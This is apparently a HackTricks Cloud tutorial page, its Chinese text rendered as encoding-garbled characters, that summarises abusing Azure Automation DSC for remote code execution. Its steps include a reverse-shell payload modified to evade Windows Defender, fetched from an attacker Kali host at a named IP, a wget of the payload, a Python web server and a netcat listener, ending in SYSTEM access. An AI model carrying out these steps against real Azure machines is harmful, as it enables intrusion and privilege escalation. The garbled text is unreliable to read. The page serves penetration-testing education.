# Az - çŠ¶æ€é…ç½®RCE

{% hint style="success" %}
å­¦ä¹ å¹¶ç»ƒä¹ AWSé»‘å®¢ï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å¹¶ç»ƒä¹ GCPé»‘å®¢ï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

**æŸ¥çœ‹å®Œæ•´å¸–å­ï¼š[https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)**

### è¿œç¨‹æœåŠ¡å™¨ï¼ˆC2ï¼‰åŸºç¡€è®¾æ–½å‡†å¤‡å’Œæ­¥éª¤æ‘˜è¦

#### æ¦‚è¿°
è¯¥è¿‡ç¨‹æ¶‰åŠè®¾ç½®è¿œç¨‹æœåŠ¡å™¨åŸºç¡€è®¾æ–½ï¼Œç”¨äºæ‰˜ç®¡ä¸€ä¸ªä¿®æ”¹è¿‡çš„Nishang `Invoke-PowerShellTcp.ps1`æœ‰æ•ˆè½½è·ï¼Œå‘½åä¸º`RevPS.ps1`ï¼Œæ—¨åœ¨ç»•è¿‡Windows Defenderã€‚æœ‰æ•ˆè½½è·ä»å…·æœ‰IP `40.84.7.74`çš„Kali Linuxæœºå™¨ä¸Šæä¾›ï¼Œä½¿ç”¨ç®€å•çš„Python HTTPæœåŠ¡å™¨æ‰§è¡Œæ“ä½œç»è¿‡å¤šä¸ªæ­¥éª¤æ‰§è¡Œï¼š

#### æ­¥éª¤1 â€” åˆ›å»ºæ–‡ä»¶
- **æ‰€éœ€æ–‡ä»¶ï¼š** éœ€è¦ä¸¤ä¸ªPowerShellè„šæœ¬ï¼š
1. `reverse_shell_config.ps1`ï¼šä¸€ä¸ªæœŸæœ›çŠ¶æ€é…ç½®ï¼ˆDSCï¼‰æ–‡ä»¶ï¼Œç”¨äºè·å–å’Œæ‰§è¡Œæœ‰æ•ˆè½½è·ã€‚å¯ä»[GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1)è·å–ã€‚
2. `push_reverse_shell_config.ps1`ï¼šä¸€ä¸ªç”¨äºå°†é…ç½®å‘å¸ƒåˆ°è™šæ‹Ÿæœºçš„è„šæœ¬ï¼Œå¯åœ¨[GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1)æ‰¾åˆ°ã€‚
- **å®šåˆ¶ï¼š** è¿™äº›æ–‡ä»¶ä¸­çš„å˜é‡å’Œå‚æ•°å¿…é¡»æ ¹æ®ç”¨æˆ·ç‰¹å®šç¯å¢ƒè¿›è¡Œå®šåˆ¶ï¼ŒåŒ…æ‹¬èµ„æºåç§°ã€æ–‡ä»¶è·¯å¾„å’ŒæœåŠ¡å™¨/æœ‰æ•ˆè½½è·æ ‡è¯†ç¬¦ã€‚

#### æ­¥éª¤2 â€” å‹ç¼©é…ç½®æ–‡ä»¶
- å°†`reverse_shell_config.ps1`å‹ç¼©ä¸º`.zip`æ–‡ä»¶ï¼Œä½¿å…¶å‡†å¤‡å¥½ä¼ è¾“åˆ°Azureå­˜å‚¨è´¦æˆ·ã€‚
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### ç¬¬3æ­¥ â€” è®¾ç½®å­˜å‚¨ä¸Šä¸‹æ–‡ & ä¸Šä¼ 
- ä½¿ç”¨ Azure çš„ Set-AzStorageBlobContent å‘½ä»¤ï¼Œå°†å‹ç¼©çš„é…ç½®æ–‡ä»¶ä¸Šä¼ åˆ°é¢„å®šä¹‰çš„ Azure å­˜å‚¨å®¹å™¨ azure-pentestã€‚
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### ç¬¬4æ­¥ â€” å‡†å¤‡Kali Box
- KaliæœåŠ¡å™¨ä»GitHubå­˜å‚¨åº“ä¸‹è½½RevPS.ps1æœ‰æ•ˆè½½è·ã€‚
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
- è„šæœ¬è¢«ç¼–è¾‘ä»¥æŒ‡å®šç›®æ ‡ Windows VM å’Œåå‘ shell çš„ç«¯å£ã€‚

#### æ­¥éª¤ 5 â€” å‘å¸ƒé…ç½®æ–‡ä»¶
- æ‰§è¡Œé…ç½®æ–‡ä»¶ï¼Œå¯¼è‡´åå‘ shell è„šæœ¬éƒ¨ç½²åˆ° Windows VM ä¸ŠæŒ‡å®šçš„ä½ç½®ã€‚

#### æ­¥éª¤ 6 â€” æ‰˜ç®¡ Payload å’Œè®¾ç½®ç›‘å¬å™¨
- å¯åŠ¨ Python SimpleHTTPServer æ¥æ‰˜ç®¡ payloadï¼Œå¹¶å¯åŠ¨ Netcat ç›‘å¬å™¨ä»¥æ•è·ä¼ å…¥è¿æ¥ã€‚
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- è®¡åˆ’ä»»åŠ¡æ‰§è¡Œæœ‰æ•ˆè½½è·ï¼Œå®ç°äº†SYSTEMçº§åˆ«çš„ç‰¹æƒã€‚

#### ç»“è®º

æ­¤è¿‡ç¨‹çš„æˆåŠŸæ‰§è¡Œä¸ºè¿›ä¸€æ­¥è¡ŒåŠ¨æ‰“å¼€äº†è®¸å¤šå¯èƒ½æ€§ï¼Œä¾‹å¦‚å‡­æ®è½¬å‚¨æˆ–å°†æ”»å‡»æ‰©å±•åˆ°å¤šä¸ªè™šæ‹Ÿæœºã€‚è¯¥æŒ‡å—é¼“åŠ±åœ¨Azure Automation DSCé¢†åŸŸç»§ç»­å­¦ä¹ å’Œåˆ›é€ ã€‚

{% hint style="success" %}
å­¦ä¹ å¹¶å®è·µAWS Hackingï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å¹¶å®è·µGCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
